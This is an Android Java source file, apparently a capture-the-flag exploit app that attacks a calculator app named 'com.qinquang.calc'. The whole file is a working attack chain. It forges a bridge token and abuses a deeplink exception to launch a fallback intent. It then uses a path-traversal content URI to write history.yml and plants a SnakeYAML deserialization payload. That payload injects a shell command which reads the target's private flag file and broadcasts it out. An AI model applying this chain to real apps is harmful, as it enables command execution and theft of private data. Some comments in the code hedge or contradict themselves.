package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.yaml.snakeyaml.Yaml;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void triggerExploit() throws Exception {
        // 1. Generate the bridge_token
        String token = generateToken(TARGET_PKG);
        Log.d(TAG, "Generated Token: " + token);

        // 2. Craft the YAML payload to execute the command
        // The command reads the flag and sends it via a broadcast
        String command = "; cat /data/data/com.qinquang.calc/flag-*.txt | xargs -I {} am broadcast -a com.qinquang.calc.FLAG --es flag {}";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";
        Log.d(TAG, "YAML Payload: " + yamlPayload);

        // 3. Craft the inner Intent that writes the YAML payload to history.yml
        // We use the path traversal vulnerability in HistoryProvider
        // The URI will be content://com.qinquang.calc/..%2f..%2ffiles%2fhistory.yml
        // The payload is passed in the "yaml_payload" extra
        Intent maliciousIntent = new Intent();
        maliciousIntent.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.HistoryActivity"));
        maliciousIntent.setData(Uri.parse("content://com.qinquang.calc/..%2f..%2ffiles%2fhistory.yml"));
        maliciousIntent.putExtra("yaml_payload", yamlPayload); // This is a trick, the actual write happens via data URI
        maliciousIntent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

        // We need to write the payload to the file. The HistoryProvider's openFile is used.
        // The BridgeActivity will start our maliciousIntent.
        // Let's craft the intent that BridgeActivity will receive.
        Intent origIntent = new Intent();
        origIntent.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.HistoryActivity"));
        origIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

        // The HistoryProvider writes the content of the intent's data URI.
        // So, we need to put our payload into a URI.
        // A simple way is to encode it in the URI itself.
        String encodedYaml = URLEncoder.encode(yamlPayload, StandardCharsets.UTF_8.name());
        // This URI will be started by BridgeActivity, and openFile will be called on it.
        // The path traversal allows writing to history.yml
        String fileProviderUri = "content://com.qinquang.calc/..%2f..%2ffiles%2fhistory.yml?payload=" + encodedYaml;
        origIntent.setData(Uri.parse(fileProviderUri));


        // Set up the values for BridgeActivity check
        ContentValues bridgeValues = new ContentValues();
        bridgeValues.put("action", "process");
        bridgeValues.put("target", "history");
        origIntent.putExtra("bridge_values", bridgeValues);
        origIntent.putExtra("bridge_token", token);


        // 4. Craft the outer deeplink Intent to trigger the exception in MainActivity
        // This will cause our `origIntent` to be launched as a fallback.
        String fallbackIntentUri = origIntent.toUri(Intent.URI_INTENT_SCHEME);
        Log.d(TAG, "Fallback Intent URI: " + fallbackIntentUri);

        // The expression "1/0" will cause an ArithmeticException
        String expression = "1/0" + "&intent:" + fallbackIntentUri;
        String encodedExpression = URLEncoder.encode(expression, StandardCharsets.UTF_8.name());
        Uri deeplinkUri = Uri.parse("qiangcalc://calc?expression=" + encodedExpression);
        Log.d(TAG, "Deeplink URI: " + deeplinkUri);

        // 5. Trigger the exploit
        Intent exploitIntent = new Intent(Intent.ACTION_VIEW, deeplinkUri);
        exploitIntent.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        exploitIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(exploitIntent);
    }

    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // This is now primarily for local testing convenience, 
        // as the FlagReceiver handles the critical logging.
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
